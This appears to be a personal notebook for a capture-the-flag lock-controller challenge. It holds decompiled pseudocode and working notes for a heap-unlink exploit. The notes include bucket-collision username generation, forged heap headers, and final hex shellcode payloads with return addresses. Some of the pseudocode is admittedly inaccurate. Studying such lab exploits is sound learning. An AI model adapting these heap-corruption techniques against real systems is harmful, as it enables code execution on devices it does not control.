Well, here we go...
An immediate observation- printf now works actually properly. r4 contains the position to read arguments from the stack.
A lot of the garbage in the program after the function actually returns is just text.

Heap is at 5000.

//Main return address is at 43f6
//jl: cmp a, b; if(b < a) or if(a > b)

/*
Observations about hash.
Single characters 8 places in the alphabet away from each other return the
Same 3 LSBs. For example, a, i, q and y return the same.
import string
ls, alphabet = [], string.ascii_lowercase
for i in range(len(alphabet)):
	ls.append((alphabet[i], alphabet[min(i + 8, len(alphabet))]))
Errors out but shows single character matches.

*/


typedef struct hash_table
{
	int table_count;
	int a;
	int b;
	void** table; //Array of 0x90 allocated pointers
	int* countertable;
};

hash_table* create_hash_table(int a, int b)
{
	hash_table* ptr = malloc(10); //3 ints + 2 pointers = 0xA size
	ptr->table_count = 0;
	ptr->a = b;
	ptr->b = a;
	int D = 2;
	for(int i = b; i != 0; i--)
		D += D;
	//D = 16
	ptr->table = malloc(D);
	ptr->countertable = malloc(D);
	int E = 1;
	for(int i = b; i != 0; i--)
		E += E;
	//E = 8
	int F = a;
	F += F;
	F += F;
	F += F;
	F += a; //Does not multiply by 2
	F += F; //F = 90
	a = 0;
	while(E > a) //jl; 8 runs in total; 8 pointers and 16 bytes used
	{
		//Get next free space position
		b = a;
		//Addresses are two bytes, not one
		b += b;
		void* G = ptr->table;
		G += b;
		//Set pointer to our free space
		*G = malloc(F);
		//Zero out the counter table.
		b += ptr->countertable;
		*b = 0;
		a++;
	}
	return ptr;
}

void main()
{run();}

/*
Generate a suitable box string. Manipulate values as needed.
while result != 2:
	rnglist = []
	for i in range(10):
	    rnglist.append(random.choice(alphabet))
	rng = ''.join(rnglist)
	username = p1 + rng + p2
	result = mchash(username) & 7
	
String to hex:
''.join(r'\x{0:x}'.format(ord(c)) for c in username).replace('\\x', '')

Hex to string:
def hextoascii(h):
    chars_in_reverse = []
    while h != 0x0:
        chars_in_reverse.append(chr(h & 0xFF))
        h = h >> 8

    chars_in_reverse.reverse()
    return ''.join(chars_in_reverse)
*/

//3de2- ret of rehash
/*
Here are the notes I started taking about exploitation when I finished
reversing rehash and had a real, tangible vulnerability on my hands.
It took me another week to exploit it.

i: *ii = i;
ii: *(i + 2) = ii;
iii: *(i + 4) = rand();


//Main header overwrite
#define headerset let 509c = 4cc6; let 509e = 5112
//Used in some of my attempts
#define headersetb let 5120 = 0000; let 5122 = 5000; let 5124 = f97c
//Get table count above maximum so rehash is triggered
#define tablevalueset let 5006 = c
//Used in some tests, ended up being unhelpful because of rehash's environment
#define freetest let pc = 471c; let r15 = 50a2

3df0 is perfectly valid for the real thing- it is the first
Address we could use after the "new ".
We can get around free writing some bad instructions...
It doesn't write the first two bytes. We can jump beyond those
Bad instructions with those two bytes.

Yikes. malloc thinks it's running out of heap because our header is
Busted.

Box 0 header overwrite: 95üP (üP = fc50)
Box 1 header overwrite: ð=â=ÿ (ð=â= is f03de23d, ÿ = 0xff for box 1)

4742- P->bk->fd = P->fd;
476a- mov 0x2(r14), 0x2(r15)
476a- bk->fd = fd->fd; Why...? This means that this (3df2) is the value
Actually written to the return address... Since we need to this to point to a
Heap header, this introduces a problem.

I have an idea... Place our shellcode somewhere in a box, then jump to the header
of that box. It should decode to a valid instruction and work fine.
Oh! malloc observes that it's run out of heap when the next address is smaller
Than the last one. So next *has* to be in heap, not stack.
Nice one, LockItAll. Nice little mitigation. Unfortunately for you
I can just put my ret address in a box. :)
Pointing to a proper header for my return address activates that quirk of free's
In just the right way. ptr->fd (ptr + 2) simply equals the next box header :)

It seems our overwrite at 50fc has strange implications... In the end, we
End up really returning to 533c! (end of heap) This is a big problem.
We can't attack free or rehash's rets, as their return addresses decode
To jump instructions, which we'll have to go through due to free.
We can, however, attack run.

We're going to have to forge a chunk that points to another forged chunk
In a later box that claims to be the end of heap (fd = 5000) so malloc
Starts allocating there. This shouldn't be hard.
#define nextheader let 50a2 = 3333; let 50a4 = 5102; let 50a6 = 0000
Here's where it's at: 5102 (box 2)
#define fakeheader let 5102 = 3253; let 5104 = 5000; let 5106 = f97c
Apparently we need the magic as well. No matter.
End-of-heap header (for box 2): 
556600507cf9
^bk ^fd ^magic
bk is simply random for box 2.
Next header:
f643a250
^header ^shellcode
Header overwrite:

Here's the attack plan:
Input 5 box 0 entries.
Input header overwrite with our header.
Input box 1 shellcode.
Input box 2 end-of-heap header.
Keep inputting random stuff for boxes 3, 4, 5, 6, 7 & 8 until we trigger rehash.
Enter an invalid command.
pwn.

But that's not going to happen, because somewhere along the line we actually
Only return to the end of the heap. Just like the last attempt.
I'm betting this has to do with free-everything bullshit- we may just have
To target free's return address and deal with the jump.
It's really not that bad- it jumps ahead 0x39a, which will probably put us in
Another box.
This approach will prevent the return address ending up at the end of the heap-
We'll immediately get execution after our write.
So this puts us in the newly allocated box, at 5496. This seems to be box 2,
So we'll just shove stuff in there and see if it runs...
rehash never gets the chance to copy our stuff over because it frees the old
Box first... Can we attack another call within rehash?
So what if we put things in box 1 until we overwrote the header,
Then kept going...? Would rehash copy those things until we were able
To put code in the right place?
rehash changes table->a, which apparently changes the hash bitmask,
which apparently fucks everything over in terms of hopefully getting things
in the same box.
***IF I HAVE TO, I CAN FIGURE THE NEW BITMASK OUT. BUT I'D RATHER NOT.***
Maybe we should change the paradigm. Can we overwrite an instruction
for a desirable result?
5120 (2051 little-endian) is an interesting instruction.
br is also interesting. We'd need to find a place in program memory that contains
The offset we want.
I have faith in this idea. Let's work more at it.
4bba is perfect. It's right after gets, and has a good sp.
add @sp, pc
//4756
free seems to allow you to skip one or the other part of unlink based on the
LSB of the... Status byte of the header.
This means that our attack on free's return address may in fact work out
If we don't have to go through that jump instruction...
That won't work out, because we can't control the address the skip reads from.
Back to the program overwrite idea.
#define eohheader let 5116 = 7f04
Holy shit, it worked. We can now control PC.
Why? It has something to do with our end-of-heap header.
Come on, a-few-days-ago-me, what were you thinking that was so clever?
You didn't write it down, asshole.
I think my past observations were that free kept walking until it reached
the end of the heap, taking my return address along for the ride.
Therefore, my idea was to put the end of the heap at the value I wanted,
and everything would work fine.
I still haven't reversed malloc and free properly, so I don't know for sure.
That was probably a big fuckup throughout this whole project... But in the
end, it's worked out.
Let's do some math. My current pc is 4bba. I want to go to 3dee 
(right after the value we're incrementing by).
(0xffff - (0x4bba - 0x3dee)) - 1 = 0xf232
-1 to deal with 0 being a thing. Without it we'd end up one past where
we want to go.
Final attack plan:
Input 5 entries in box 0.
Overwrite the header.
6e657720b84b305164
^"new " ^header ^box 0
Put 2 things in box 2. "new f"
Input our end-of-heap header at 5120.
new n 32708
    ^ ^0x7ff4 (end-of-heap status)
	^'n' (box 2)
Keep inputting things until a rehash is triggered, overwriting an instruction.
Input our sp increment + shellcode.
32f2324000ffb0121000
^   ^shellcode
^sp increment
Kerblam! This had better work in practicality. Seeing as it did with let.
5120 is arranged so the last 4 characters of the username will be the
first two parts of the header, and the password will be the last piece.
"new " = 6e657720
Oops! 51*20* provides a space, which kills add_to_table.
5130 is unattackable as it's laid out in such a way that we can't
enter the eoh status with it.
So we're out of luck with using sp to move.
What if we overwrote the instruction to add sp when run returns?
4cc8? Could be interesting.
We could overwrite it with address 5112 (1251, add (offset)(sp), sr)
And we're given an offset by free. Which perfectly overwrites
that instruction. Which means we'd be in the clear to give a return
address. And if that particular piece of heap doesn't work, we can
try another one. We just have to not influence pc.
This does in fact function. 10 bytes in to our invalid command, we
can input a return address.
run's new return address- 3df6
shellcode- FFFFFFFFFFFFFFFFFFFFf83d324000ffb0121000
So this attack is pretty much the same as above.
Input 5 things in box 0.
Input header overwrite:
6e657720c64c145173
^'new ' ^header ^s (box 0)
Input 1 thing in box 2. "new f"
Input our end-of-heap header:
6e6577206f687163047f
^'new ' ^       ^end-of-heap
        ^padding(box 2)
Keep inputting 4 things until rehash is triggered.
Input our shellcode.
324000ffb0121000FFFFec3d
^shellcode      ^   ^return address
                ^padding
Profit.
OK, add two bytes of padding to the EOH header, and set the overwrite
to not touch sr, which turns off the CPU. LMAO
:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD

*/
//3de2 3e00

void rehash(int a, hash_table* table)
{
	//a = r14, table = r11
	int oldtbla = table->a; //r6
	void** oldptrtable = table->table; //r5
	int* oldctable = table->countertable; //r4
	table->a = a; //a is incremented then passed in here...
	table->table_count = 0;
	int newsize = 2; //r10
	while(a)
	{
		newsize += newsize;
		a--;
	}
	//newsize = 32. Is this a reallocation to fit the new entry?
	//In the original creation, this loop is done with the size initially 1.
	//Thus this is now a 32 byte table instead of 16...
	table->table = malloc(newsize);
	table->countertable = malloc(newsize);
	int counter = 0; //r10
	int unk2 = 1; //r8
	
	int newa = table->a; //r13
	int unk3 = unk2; //r14
	while(newa)
	{
		unk3 += unk3;
		newa--;
	} //unk3 = 16
	while(counter < unk3)
	{
		int offset = counter; //r9
		offset += offset; //Pointers are two bytes, not one
		char** ptr = table->table + unk4; //r7
		int unk4 = table->b; //r15
		int unk5 = unk4; ///r14
		unk5 += unk5;
		unk5 += unk5;
		unk5 += unk5;
		unk5 += unk4;
		unk5 += unk5;
		//unk5 = 90. Same as original. 
		//This seems to reallocate the entire table.
		*ptr = malloc(unk5);
		offset += table->countertable;
		*offset = 0; //Reset counter as we've realloc'd
		counter++;
	}
	//4964
	int anothera = oldtbla; //r15
	int bankcount = 1; //r14
	while(anothera)
	{
		bankcount += bankcount;
		anothera--;
	} //bankcount = 8
	//bankcount is pushed onto stack.
	void** oldptrtable2 = oldptrtable; //r10
	int* oldctable2 = oldctable; //r9
	int counter = 0; //r7
	//This control flow is weird, and doesn't fit C loops.
	//It might be identifiable by inlined functions.
	//Or by compiler optimizations.
	goto loopend;
/**/loopstart:
	char* str = *oldptrtable2;
	str += unk7;
	int pin = *(str + 16);
	add_to_table(pin, str, table);
	unk8++;
	unk7 += 18; //Full username + password
	goto loopmiddle2;
/**/loopmiddle:
	int unk7 = 0; //r8
	int unk8 = unk7; //r6
/**/loopmiddle2:
	if(*oldctable2 < unk8) goto loopstart;
/**/loopend:
	if(counter < bankcount) goto loopmiddle;
	//Our chunk is freed.
	//:D
	free(*oldptrtable2); //Wheeeeee
	counter++;
	oldptrtable2 += 2; //Next address
	if(counter < bankcount) goto loopmiddle;
	
}

void add_to_table(int pin, char* username, hash_table* table)
{
	//pin = r9, username = r10, table = r11
	int a = table->a; //r14, = 3
	int b = table->b; //r12, = 5
	for(int i = a; i > 0; i--)
		b += b;
	if(b <= 0) //tst, jge- I still have issues with this pattern...
		b += 3;
	b >>= 2; //b = 10 after this
	if(table->table_count >= b)
	{
		a++;
		rehash(a, table); //Regenerate
	}
	table->table_count++;
	int hash = hash(username); //r15
	int tbloffset = 1; //r12
	a = table->a; //Recalculation?
	while(a) //Calculate bitmask
	{
		tbloffset += tbloffset;
		a--;
	}
	tbloffset--;
	//tbloffset = 7, or 0b111 (thus, values are limited to <=7)
	//Which makes sense, as there are 8 banks to work with.
	//There are no bounds checks if we can get two users into the same box.
	//But how the hell do we do that?
	//The key is in the three least significant bits of the hash.
	//It's easy to observe what ends up where- the ctable shows us.
	//I've built a rainbow table generator in Python to do this
	//Task automagically: It calculates usernames for each of the 8 boxes.
	//Assuming we can continue to add things in the same box,
	//The username of the 6th input should overwrite the next header.
	tbloffset &= hash; //The big piece of the puzzle. This is critical.
	void* ctablepos = table->countertable + tbloffset; //r15
	int unk = *ctablepos; //r14
	void* tablepos = table->table + tbloffset; //r11, the table pointer is overwritten...
	int unk2 = unk; //r12
	unk2 += unk2; //Some kind of offset.
	unk2 += unk2;
	unk2 += unk2;
	unk2 += unk;
	unk2 += unk2;
	unk2 += *tablepos; //Final pointer?
	unk++;
	*ctablepos = unk; //Some kind of counter.
	int ctr = 0; //r15
	//48ae
	char c = *username;
	while(c)
	{
		int destpos = unk2;
		destpos += ctr;
		*destpos = c;
		ctr++;
		if(ctr == 15) break;
		username++;
		c = *username;
	}
	*(destpos + 16) = pin;
}

int get_from_table(char* username, hash_table* table)
{
	//username = r6, table = r10
	int hash = hash(username); //r15
	int tbloffset = 1; //r11
	int unk2 = table->a; //r13, = 3
	while(unk2)
	{
		tbloffset += tbloffset;
		unk2--;
	}
	tbloffset--;
	tbloffset &= hash;
	tbloffset += tbloffset;
	tbloffset += tbloffset;
	void* tablepos = tbloffset + table->table;//Pointer to real ID in table, r13
	int counter = 0; //r8
	char* account = *tablepos; //Actual string, r9
	void* ctablepos = table->ctable + tbloffset; //r15, recalculated at end of each loop
	while(counter < *ctablepos)
	{
		//r7, to save account before addition if strcmp returns true
		//(See disassembly, this isn't presented well here)
		char* accountb = account;
		if(strcmp(account, username) == 0)
			return accountb + 16;
		account += 18; //16 byte username, 2 byte pin?
		counter++;
	}
	return -1;
}

void run()
{
	//Stack is moved...
	hash_table* hashtable = create_hash_table(5, 3);
	puts("Welcome to the lock controller.\nYou can open the door by typing 'access [your name] [pin]'.");
	char buf[0x5ff];
	memsetandgets:
	memset(buf, 0, 0x5ff); //Inlined
	getsn(buf, 0x550);
	char* strpos = buf;
	char c = *strpos;
	while(c)
	{
		//Access
		if(c == 'a')
		{
			//Most of the same stuff as "new", see below
			char* pinpos = strpos + 7;
			strpos = pinpos;
			while(c) //Looking for space
			{
				if(c == 0x20) //Space
				{
					//Insert null terminator so printf doesn't print
					//The pin later, only the username
					*strpos = 0;
					break;
				}
				strpos++;
				c = *strpos;
			}
			//Collect the pin into the variable (?)
			while(c || c != ';') //Might be wrong; recheck
			{
				int pinaccum = pin;
				pinaccum += pinaccum; //Formula to accumulate pin
				pinaccum += pinaccum; //From string to int.
				pinaccum += pin;
				pinaccum += pinaccum;
				pin = *strpos;
				asm("sxt pin");
				pin += 0xffd0;
				pin += pinaccum;
				strpos++;
				c = *strpos;
			}
			int getret = get_from_table(pinpos, hashtable);
			if(getret == -1)
			{
				puts("No such box.");
				goto end;
			}
			else
			{
				pin ^= getret;
				if(pin &= 0x7fff)
				{
					if(getret >= pin)
					{
						puts("Access granted; but account not activated.");
						goto end;
					}
					else
					{
						//Doesn't actually unlock???
						puts("Access granted.");
						goto end;
					}
				}
			}
		}
		//if(c != 'n') goto notunkcommand;
		//Adds user account to the list, but does not activate it
		//Likely "new " (including space)
		else if(c == 'n')
		{
			//Used later on; Position of username + pin
			char* pinpos = strpos + 4; //Skip rest of command + space
			strpos = pinpos;
			c = *strpos;
			while(c) //Looking for space
			{
				if(c == 0x20) //Space
				{
					//Insert null terminator so printf doesn't print
					//The pin later, only the username
					*strpos = 0;
					break;
				}
				strpos++;
				c = *strpos;
			}
			strpos++;
			int pin = 0;
			c = *strpos;
			//Collect the pin into the variable (?)
			while(c || c != ';') //Might be wrong; recheck; @4c76
			{
				int pinaccum = pin;
				pinaccum += pinaccum; //Formula to accumulate pin
				pinaccum += pinaccum; //From string to int.
				pinaccum += pin;
				pinaccum += pinaccum;
				pin = *strpos;
				asm("sxt pin");
				pin += 0xffd0;
				pin += pinaccum;
				strpos++;
				c = *strpos;
			}
			if(pin <= 0) //Almost certainly wrong; See @4c84
			{
				//Reference to the sign bit?
				puts("Can not have a pin with high bit set.");
				goto end;
			}
			else if(get_from_table(pinpos, hashtable) != -1)
			{
				puts("User already has an account.");
				goto end;
			}
			else
			{
				printf("Adding user account %s with pin %x\n", strpos, pin);
				add_to_table(pin, pinpos, hashtable);
				goto end;
			}
		}
		//This is important- execution falls down here, not the
		//End of the loop, if it doesn't find anything. It only
		//Falls to the end of the loop if we get a valid command
		//And that command takes us there.
		else
		{
			puts("Invalid command.");
			return;
		}
		strpos++;
		//Semicolons have *some* special meaning in here...
		//I've yet to find out what.
		while(c == ';')
		{
			strpos++;
			c = *strpos;
		}
		strpos++;
		c = *strpos;
	}
	goto memsetandgets;
}